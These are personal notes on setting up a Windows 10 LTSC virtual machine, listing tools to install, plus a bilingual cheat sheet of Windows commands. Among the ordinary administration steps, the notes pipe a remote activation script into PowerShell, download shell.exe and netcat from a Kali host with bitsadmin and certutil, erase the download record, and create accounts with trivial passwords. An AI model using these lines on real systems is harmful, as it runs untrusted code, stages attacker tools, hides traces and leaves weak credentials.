Windows is a product line of proprietary graphical operating systems developed and marketed by Microsoft.

## 1. Step

- [VirtualBox](https://www.virtualbox.org/)
- [Windows 10 Enterprise LTSC 2021](https://massgrave.dev/windows_ltsc_links)

## 2. Config

Move the images file to the directory

```
%UserProfile%\VirtualBox VMs\ISO
```

Create a new virtual machine

```
/Home/New
```

```
VM Name: windows
VM Folder: C:\Users\null\VirtualBox VMs
ISO lmage: C:\Users\null\VirtualBox VMs\ISO\en-us_windows_10_iot_enterprise_ltsc_2021_x64_dvd.iso
[ ] Proceed with Unattended Installation
Base Memory: 8192 MB
Number of CPUs: 2 CPU
Disk Size: 64.00GB
```

Take Snapshot: `config` 

## 3. Install

运行虚拟机

```
/Machines/VM/Start
```

Enter your language and other preferences and click "Next" to continue.

```
Language to install: English (United States)
Time and currency format: English (United States)
Keyboard or input method: US
```
Repair your computer

```
Install now
```

Activate Windows

```
I don't have a product key
```

Select the operating system you want to install

```
Windows 10 Enterprise LTSC
```

Applicable notices and license terms

```
[√] I accept the license terms
```

Which type of installation do you want?

```
Custom: Install Windows only (advanced)
```

Where do you want to install Windows?

```
Drive 0 Unallocated Space
```

Let's start with reqion. Is this right?

```
United States
```

Is this the right keyboard layout?

```
US
```

Want to add a second keyboard layout?

```
Add layout
```

What language do you want to use for your second keyboard layout?

```
Chinese (Simplified, China)
```

Which keyboard layout would you like to use?

```
Microsoft Pinyin
```

Let's connect you to a network

```
I dont't have a internet
```

There's more discover when you connect to the inernet

```
Continue with limited setup
```

> Sign in with Microsoft
>
> ```
> Domain join instead
> ```

Who's going to use this PC?

```
null
```

Create a super memorable password

```
123456
```

Confirm your password

```
123456
```

Create security questions for this account

```
What's the name of the city where you were born?
null
What's the name of the city where your parents met?
null
What's the name of the first school you attended?
null
```

Choose privacy settings for your device

```
Location: No
Diagnostic data: No
Tailored experiences: No
Find my device: No
Inking & typing: No
Advertising ID: No
```

Shut down, Take Snapshot: `install` 

## 4. Init

Install drivers and update the system

[Power Options](# 6.25. Power Options)

[ExecutionPolicy](# 6.20. ExecutionPolicy)

[System Protection](# 6.21. System Properties)

[Folder Option](# 6.23. Folder Option)

[Search icon](# 6.22. Search icon)

Run Windows PowerShell as Administrator

Disable the hibernation

```
PS C:\Windows\system32> powercfg -h off
```

Activation

```
PS C:\Windows\system32> irm https://get.activated.win | iex
```

Get the InterfaceIndex

```
PS C:\Windows\system32> Get-NetConnectionProfile
```

Change the network profile to Private or Public

```
PS C:\Windows\system32> Set-NetConnectionProfile -InterfaceIndex <value> -NetworkCategory Private
```

```
PS C:\Windows\system32> Set-NetConnectionProfile -InterfaceIndex <value> -NetworkCategory Public
```

View the DNS server addresses

```
PS C:\Windows\system32> Get-DnsClientServerAddress -InterfaceIndex <value>
```

Set a static DNS server address

```
PS C:\Windows\system32> Set-DnsClientServerAddress -InterfaceIndex <value> -ServerAddresses ("223.5.5.5","119.29.29.29")
```

Update and configure Windows and Edge

[Local Computer Policy](#6.24. Local Computer Policy)

[Power Options](# 6.25. Power Options)

Use [Office Deployment Tool](https://keithpeck177271.gitbook.io/notes/docs/misc/lab_env/office/file_editing/microsoft_office/office_deployment_tool) to install Word, Excel, PowerPoint

VM needs to create a folder and add exclusions

```
%UserProfile%\Apps
```

PM needs to create a folder and install [VisualCppRedist AIO](https://github.com/abbodi1406/vcredist)

```
%UserProfile%
    ├─Documents
    │    ├─Github
    |    ├─KeePassXC
    |    ├─VeraCrypt
    |    └─Key
    └─Pictures
    |    └─ScreenClip
    └─VirtualBox VMs
         └─ISO
```

> ScreenClip Shortcut
>
> ```
> %UserProfile%\AppData\Local\Packages\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TempState\ScreenClip
> ```

Shut down, Take Snapshot: `init` 

## 5. Deploy

|                   VM                    |
| :-------------------------------------: |
|     [7-Zip](https://www.7-zip.org/)     |
|  [Geek](https://geekuninstaller.com/)   |
| [Proxifier](https://www.proxifier.com/) |
|    [WeChat](https://weixin.qq.com/)     |

Shut down, Take Snapshot: `deploy` 

|                            Laptop                            |
| :----------------------------------------------------------: |
| [Lenovo System Update](https://www.lenovo.com/us/en/software/lenovo-system-update) |

|                           Desktop                            |
| :----------------------------------------------------------: |
| [AMD Software꞉ Adrenalin Edition](https://www.amd.com/en/support/download/drivers.html) |
| [Twinkle Tray](https://github.com/xanderfrangos/twinkle-tray) |

|                              PM                              |
| :----------------------------------------------------------: |
|               [7-Zip](https://www.7-zip.org/)                |
|            [Anytxt Searcher](https://anytxt.net/)            |
|              [aria2](https://aria2.github.io/)               |
| [Burp Suite](https://portswigger.net/burp/releases#professional) |
| [ContextMenuManager](https://bluepointlilac.github.io/ContextMenuManager/) |
|           [Everything](https://www.voidtools.com/)           |
|             [Geek](https://geekuninstaller.com/)             |
|                 [Git](https://git-scm.com/)                  |
|           [GlassWire](https://www.glasswire.com/)            |
|       [Google Chrome](https://www.google.com/chrome/)        |
|            [ImagesGlass](https://imageglass.org/)            |
|             [Java](https://www.oracle.com/java/)             |
|             [KeePassXC](https://keepassxc.org/)              |
|             [LocalSend](https://localsend.org/)              |
|            [LockHunter](https://lockhunter.com/)             |
|               [OpenVPN](https://openvpn.net/)                |
|       [Oracle VirtualBox](https://www.virtualbox.org/)       |
|           [Pinta](https://www.pinta-project.com/)            |
|               [PixPin](https://pixpinapp.com/)               |
| [PowerShell](https://apps.microsoft.com/detail/9mz1snwt0n5d?hl=en-US&gl=DE) |
|           [Proxifier](https://www.proxifier.com/)            |
|         [qBittorrent](https://www.qbittorrent.org/)          |
|        [scrcpy](https://github.com/Genymobile/scrcpy)        |
|         [Stretchly](https://hovancik.net/stretchly/)         |
|             [Syncthing](https://syncthing.net/)              |
|            [TTime](https://ttime.timerecord.cn/)             |
|     [TurboTop](https://www.savardsoftware.com/turbotop/)     |
|                 [Typora](https://typora.io/)                 |
|          [v2rayN](https://github.com/2dust/v2rayN)           |
|      [VeraCrypt](https://www.veracrypt.fr/en/Home.html)      |
|        [VLC media player](https://www.videolan.org/)         |
|     [Visual Studio Code](https://code.visualstudio.com/)     |
|   [WindowsTerminal](https://github.com/microsoft/terminal)   |
|                 [Yakit](https://yaklang.io/)                 |

## 6. Usage

### 6.1. 查看帮助

```cmd
C:\Users\Administrator> [command] /?
```

### 6.2. 历史命令

查看历史命令

```cmd
C:\Users\Administrator> doskey /history
```

### 6.3. 远程下载

**bitsadmin**

使用 bitsadmin 下载文件

```cmd
C:\Users\Administrator> bitsadmin /transfer n http://kali.local/upload/shell.exe C:\Users\Administrator\shell.exe
```

```cmd
C:\Users\Administrator> bitsadmin /rawreturn /transfer getfile http://kali.local/upload/shell.exe C:\Users\Administrator\shell.exe
```

**certutil**

使用 certutil 下载文件

```cmd
C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc.exe C:\Users\Administrator\nc.exe
```

删除 certutil 下载记录

```cmd
C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc.exe delete
```

### 6.4. 程序

运行程序

```cmd
C:\Users\Administrator> start shell.exe
```

### 6.5. 修改编码

查看当前编码

```cmd
C:\Users\Administrator> chcp
```

修改编码为 UTF-8

```cmd
C:\Users\Administrator> chcp 65001
```

编码列表

```
65001	UTF-8		Unicode
936		GB2312		简体中文
936		GBK			简体中文，包括更多的字符
950		Big5		繁体中文
437		MS-DOS		美式英语
932		Shift-JIS	日语
949		EUC-KR		韩语
```

### 6.6. 用户管理

查看用户名

```cmd
C:\Users\Administrator> whoami
```

```cmd
whoami
a-win10-1903\administrator
```

添加用户

```cmd
C:\Users\Administrator> net user admin admin /add
```

```cmd
net user admin admin /add
The command completed successfully.
```

查看所有用户

```cmd
C:\Users\Administrator> net user
```

```cmd
net user

User accounts for \\A-WIN10-1903

-------------------------------------------------------------------------------
admin                    Administrator            DefaultAccount           
Guest                    null                      WDAGUtilityAccount       
The command completed successfully.
```

查看用户信息

```cmd
C:\Users\Administrator> net user admin
```

```cmd
net user admin
User name                    admin
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?2024/?1/?2 15:47:13
Password expires             ?2024/?2/?13 15:47:13
Password changeable          ?2024/?1/?2 15:47:13
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```

删除用户

```cmd
C:\Users\Administrator> net user admin /del
```

```cmd
net user admin /del
The command completed successfully.
```

### 6.7. 文件权限

![文件权限](./../../../../../images/Windows/Usage/%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90.png)

### 6.8. 查看进程

```cmd
C:\Users\Administrator> netstat -ano
```

### 6.9. 查看系统架构

```cmd
C:\Users\Administrator> wmic os get osarchitecture
```

### 6.10. 添加环境变量

添加环境变量

![添加环境变量](./../../../../../images/Windows/Usage/%E6%B7%BB%E5%8A%A0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.png)

> 添加多个变量时使用 `;` 间隔
>
> ```
> Path
> %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;D:\software\Microsoft VS Code\bin;D:\software\SDelete
> ```

### 6.11. 临时文件夹

```powershell
PS C:\Users\null> dir C:\Windows\Temp
```

### 6.12. 添加快捷访问

![添加快捷访问](./../../../../../images/Windows/Usage/%E6%B7%BB%E5%8A%A0%E5%BF%AB%E6%8D%B7%E8%AE%BF%E9%97%AE.png)

### 6.13. 查看网络

```cmd
C:\Users\Administrator> route print
```

### 6.14. 权限

```
SYSTEM : 系统权限，可对系统文件进行修改
Administrator : 管理员权限，可对所有普通用户文件进行修改
User : 普通用户权限
Administrator : 可以通过 psexec 获取 SYSTEM 权限
Administrator : 用户读取其它进程内存需要获取 debug 权限，SYSTEM 不需要
```

### 6.15. 修复

扫描系统文件的完整性，并修复受损的文件

```cmd
C:\Users\Administrator> sfc /scannow
```

### 6.16. 禁用 WSL

列出当前系统上安装的 WSL 发行版

```powershell
PS C:\Users\null> wslconfig /l
```

删除 WSL 发行版

```powershell
PS C:\Users\null> wsl --unregister <distribution name>
```

禁用 WSL 功能

```powershell
PS C:\Users\null> Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
```

检查 WSL 状态

```powershell
PS C:\Users\null> wslconfig /l
```

关闭虚拟机平台

![关闭虚拟机平台](./../../../../../images/Windows/Usage/%E5%85%B3%E9%97%AD%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B3%E5%8F%B0.png)

### 6.17. 删除

要删除一个文件，你可以运行：

```powershell
Remove-Item "C:\path\to\file.txt"
```

要删除一个目录及其内容，你可以运行：

```powershell
Remove-Item "C:\path\to\directory" -Recurse
```

### 6.18. 证书安装

双击证书文件安装

![双击证书文件安装](./../../../../../images/Windows/Usage/%E5%8F%8C%E5%87%BB%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E5%AE%89%E8%A3%85.png)

选择安装到当前用户

![选择安装到当前用户](./../../../../../images/Windows/Usage/%E9%80%89%E6%8B%A9%E5%AE%89%E8%A3%85%E5%88%B0%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7.png)

选择存储到受信任的根证书颁发机构

![选择存储到受信任的根证书颁发机构](./../../../../../images/Windows/Usage/%E9%80%89%E6%8B%A9%E5%AD%98%E5%82%A8%E5%88%B0%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E6%A0%B9%E8%AF%81%E4%B9%A6%E9%A2%81%E5%8F%91%E6%9C%BA%E6%9E%84.png)

### 6.19. SSH 连接记录

SSH 连接记录

```
%UserProfile%/.ssh/known_hosts
```

### 6.20. ExecutionPolicy

查看当前策略

```
PS C:\Users\null> Get-ExecutionPolicy -List
```

临时允许脚本运行

```
PS C:\Users\null> Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

永久允许脚本运行 (推荐)

```
PS C:\Users\null> Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

### 6.21. System Properties

启用系统保护

```
Settings\About\Advanced system settings\System Protection
```

![启用系统保护](./../../../../../images/Windows/Usage/%E5%90%AF%E7%94%A8%E7%B3%BB%E7%BB%9F%E4%BF%9D%E6%8A%A4.png)

关闭远程协助

```
Settings\About\Advanced system settings\Remote
```

![关闭远程协助](./../../../../../images/Windows/Usage/%E5%85%B3%E9%97%AD%E8%BF%9C%E7%A8%8B%E5%8D%8F%E5%8A%A9.png)

### 6.22. Search icon

调整为显示搜索图标

![调整为显示搜索图标](./../../../../../images/Windows/Usage/%E8%B0%83%E6%95%B4%E4%B8%BA%E6%98%BE%E7%A4%BA%E6%90%9C%E7%B4%A2%E5%9B%BE%E6%A0%87.png)

### 6.23. Folder Option

显示文件扩展名并配置资源管理器

![显示文件扩展名并配置资源管理器](./../../../../../images/Windows/Usage/%E6%98%BE%E7%A4%BA%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%B9%B6%E9%85%8D%E7%BD%AE%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8.png)

### 6.24. Local Computer Policy

Run `gpedit.msc` 

不显示锁屏

```
Local Computer Policy\Computer Configuration\Administrative Templates\Control Panel\Personalization\Do not display the lock screen > Enabled
```

![不显示锁屏](./../../../../../images/Windows/Usage/%E4%B8%8D%E6%98%BE%E7%A4%BA%E9%94%81%E5%B1%8F.png)

在下载和安装任何更新之前通知

```
Local Computer Policy\Computer Configuration\Administrative Templates\Windows Components\Windows Update\Configure Automatic Updates
```

![在下载和安装任何更新之前通知](./../../../../../images/Windows/Usage/%E5%9C%A8%E4%B8%8B%E8%BD%BD%E5%92%8C%E5%AE%89%E8%A3%85%E4%BB%BB%E4%BD%95%E6%9B%B4%E6%96%B0%E4%B9%8B%E5%89%8D%E9%80%9A%E7%9F%A5.png)

### 6.25. Power Options

Open the **Power Options**

```
Control Panel\Hardware and Sound\Power Options
```

**Desktop**

Select the **High performance**, change plan settings

```
Turn off the display:      Never
Put the computer to sleep: Never
```

Choose what the power buttons do

```
Power and sleep buttons and lid settings
When I press the power button: Shut down
When I press the sleep button: Sleep
Shutdown settings
    [√] Sleep
    [√] Lock
```

**Laptop**

Select the **Balanced Mode**, change plan settings

```
                           On battery    Plugged in
Turn off the display:      5 minutes     Never
Put the computer to sleep: 15 minutes    Never
```

Choose what the power buttons do

```
Power and sleep buttons and lid settings
                               On battery    Plugged in
When I press the power button: Shut down     Shut down
When I press the sleep button: Sleep         Sleep
When I close the lid:          Do nothing    Do nothing
Shutdown settings
    [√] Sleep
    [√] Lock
```

---

**References**

- [Windows](https://learn.microsoft.com/en-us/windows/)

